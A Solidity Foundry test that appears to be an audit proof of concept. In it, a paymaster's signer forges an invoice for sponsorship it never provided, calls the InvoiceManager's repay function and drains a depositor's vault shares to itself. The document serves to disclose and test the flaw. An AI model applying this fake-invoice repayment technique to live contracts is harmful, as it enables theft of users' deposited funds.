// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {EntryPoint} from "account-abstraction/core/EntryPoint.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CABPaymaster} from "../src/paymasters/CABPaymaster.sol";
import {InvoiceManager} from "../src/core/InvoiceManager.sol";
import {VaultManager} from "../src/vaults/VaultManager.sol";
import {IVaultManager} from "../src/interfaces/IVaultManager.sol";
import {BaseVault} from "../src/vaults/BaseVault.sol";
import {IInvoiceManager} from "../src/interfaces/IInvoiceManager.sol";
import {UpgradeableOpenfortProxy} from "../src/UpgradeableOpenfortProxy.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";

contract CABPaymasterTest is Test {

    uint256 immutable BASE_CHAIN_ID = 8453;
    
    CABPaymaster public paymaster;
    InvoiceManager public invoiceManager;
    VaultManager public vaultManager;
    BaseVault public openfortVault;
    MockERC20 public mockERC20;

    address public verifyingSignerAddress;
    uint256 public verifyingSignerPrivateKey;
    address public owner;
    address public rekt;

    function setUp() public {
        owner = address(1);
        rekt = address(2);

        verifyingSignerPrivateKey = uint256(keccak256(abi.encodePacked("VERIFIYING_SIGNER")));
        verifyingSignerAddress = vm.addr(verifyingSignerPrivateKey);
        vm.label(verifyingSignerAddress, "VERIFIYING_SIGNER");

        invoiceManager = InvoiceManager(payable(new UpgradeableOpenfortProxy(address(new InvoiceManager()), "")));
        vaultManager = VaultManager(
            payable(
                new UpgradeableOpenfortProxy(
                    address(new VaultManager()),
                    abi.encodeWithSelector(
                        VaultManager.initialize.selector, owner, IInvoiceManager(address(invoiceManager)), 42
                    )
                )
            )
        );
        mockERC20 = new MockERC20();
        openfortVault = BaseVault(
            payable(
                new UpgradeableOpenfortProxy(
                    address(new BaseVault()),
                    abi.encodeWithSelector(
                        BaseVault.initialize.selector, IVaultManager(address(vaultManager)), mockERC20
                    )
                )
            )
        );
        invoiceManager.initialize(owner, IVaultManager(address(vaultManager)));
        paymaster = new CABPaymaster(new EntryPoint(), invoiceManager, verifyingSignerAddress);
        assertEq(address(invoiceManager.vaultManager()), address(vaultManager));
        assertEq(address(vaultManager.invoiceManager()), address(invoiceManager));
    }

    function testRektCanGetRekt() public {

        vm.prank(owner);
        vaultManager.addVault(openfortVault);

        vm.startPrank(rekt);
        invoiceManager.registerPaymaster(address(paymaster), paymaster, block.timestamp + 1000);
        mockERC20.mint(rekt, 10000);

        // Rekt Has 10000 MockERC20
        assertEq(mockERC20.balanceOf(rekt), 10000);

        mockERC20.approve(address(vaultManager), 10000);
        vaultManager.deposit(mockERC20, openfortVault, 10000, false);

        // Openfort Vault Has 10000 MockERC20
        assertEq(openfortVault.totalAssets(), 10000);
        // Rekt Has 10000 Shares In Openfort Vault
        assertEq(vaultManager.vaultShares(rekt, openfortVault), 10000);

        IInvoiceManager.RepayTokenInfo[] memory repayTokenInfos = new IInvoiceManager.RepayTokenInfo[](1);
        repayTokenInfos[0] = IInvoiceManager.RepayTokenInfo({vault: openfortVault, amount: 10000, chainId: BASE_CHAIN_ID});
        IInvoiceManager.InvoiceWithRepayTokens memory maliciousInvoice = IInvoiceManager.InvoiceWithRepayTokens({
            account: rekt,
            nonce: 0,
            paymaster: address(paymaster),
            sponsorChainId: BASE_CHAIN_ID,
            repayTokenInfos: repayTokenInfos
        });

        // This Invoice hash doesn't map to any real invoice
        // Paymaster didn't front any fund on any chain
        // But still can sign any fake invoice and get repaid.

        bytes32 maliciousInvoiceHash = keccak256(
            abi.encode(
                maliciousInvoice.account,
                maliciousInvoice.nonce,
                maliciousInvoice.paymaster,
                maliciousInvoice.sponsorChainId,
                keccak256(abi.encode(maliciousInvoice.repayTokenInfos))
            )
        );

        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(verifyingSignerPrivateKey, MessageHashUtils.toEthSignedMessageHash(maliciousInvoiceHash));

        vm.chainId(BASE_CHAIN_ID);
        // Paymaster verifyingSigner calls repay with a fake invoice signature
        invoiceManager.repay(keccak256("fake invoice"), maliciousInvoice, abi.encodePacked(r, s, v));
        // Rekt has been rekt
        assertEq(vaultManager.vaultShares(rekt, openfortVault), 0);
        // Evil Malicious Paymaster Has 10000 MockERC20
        assertEq(mockERC20.balanceOf(address(paymaster)), 10000);
    }
}
